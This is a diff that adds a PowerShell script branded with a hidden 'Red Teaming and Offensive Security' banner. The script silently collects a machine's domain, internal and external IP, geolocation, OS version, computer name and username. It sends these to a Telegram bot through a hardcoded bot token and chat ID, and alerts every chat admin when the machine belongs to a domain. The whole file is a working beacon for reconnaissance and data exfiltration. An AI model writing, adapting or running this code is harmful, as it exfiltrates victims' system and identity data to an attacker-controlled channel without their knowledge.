@@ -1,0 +1,81 @@
+param (
+    [string]$message
+)
+
+#-------------------------
+$debug = $false #Debug mode
+#-------------------------
+
+$decodedArt = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnwgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICBfICAgXyAgICAgICBfICAgICAgIF9fX18gIF8gICAgICAgICAgICAgXyAgICAgICAgICAgICAJICAgICAJIHwNCnwgICAgICAgICB8IF9fX198XyBfXyAgIF9fXyBfIF9fIF8gICBfIF8gX18gfCB8X3wgfCB8IHxfICAgX3wgfF9fICAgLyBfX198fCB8XyBfX18gIF9fIF98IHwgX19fIF8gX18gICAgICAgICAgICAgfA0KfCAgICAgICAgIHwgIF98IHwgJ18gXCAvIF9ffCAnX198IHwgfCB8ICdfIFx8IF9ffCB8X3wgfCB8IHwgfCAnXyBcICBcX19fIFx8IF9fLyBfIFwvIF8nIHwgfC8gXyBcICdfX3wgICAgICAgICAgICB8DQp8ICAgICAgICAgfCB8X19ffCB8IHwgfCAoX198IHwgIHwgfF98IHwgfF8pIHwgfF98ICBfICB8IHxffCB8IHxfKSB8ICBfX18pIHwgfHwgIF9fLyAoX3wgfCB8ICBfXy8gfCAgICAgICAgICAgICAgIHwNCnwgICAgICAgICB8X19fX198X3wgfF98XF9fX3xffCAgIFxfXywgfCAuX18vIFxfX3xffCB8X3xcX18sX3xfLl9fLyAgfF9fX18vIFxfX1xfX198XF9fLF98X3xcX19ffF98ICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fXy98X3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0="))
+if ($debug){
+	Write-Host $decodedArt -ForegroundColor Red
+}
+
+$ErrorActionPreference = 'SilentlyContinue'
+
+$Messaging = $message
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$compSystem = Get-WmiObject -Class Win32_ComputerSystem
+$domain = $null
+if ($compSystem.PartOfDomain) {
+    $domain = "$($compSystem.Domain)"
+} else {
+	Write-Output "[!] Domain not found" -ForegroundColor Red
+}
+
+$botToken = "7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo" 
+$chatID = "-1002168553106"
+$serverIP = "Server IP"
+$os = Get-WmiObject Win32_OperatingSystem
+$osVersion = $os.Caption
+$ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
+$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+$externalIP = $ipInfo.ip
+$computerName = $env:COMPUTERNAME
+$userName = $env:USERNAME
+
+#----------LOCATION----------
+$ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
+$location = $ipInfo.loc
+$city = $ipInfo.city
+$region = $ipInfo.region
+$country = $ipInfo.country
+
+
+if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
+	if($domain){
+	$redExclamation = [char]0x203C
+	$messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
+	$adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
+	$admins = $adminResponse.result
+		foreach ($admin in $admins) {
+			$adminId = $admin.user.id
+			$sendMessageParams = @{
+				chat_id = $adminId
+				text = $messageText
+				parse_mode = "HTML"
+			}
+			$jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
+			$utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
+			try {
+				Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
+			} catch {
+				Write-Output "[!] Restricted: $adminId" -ForegroundColor Red
+			}
+		}
+	}
+	else{
+		$messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
+		$sendMessageParams = @{
+			chat_id = $chatId
+			text = $messageText
+			parse_mode = "HTML"
+		}
+
+		$jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
+		$utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
+
+		Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
+	}
+}
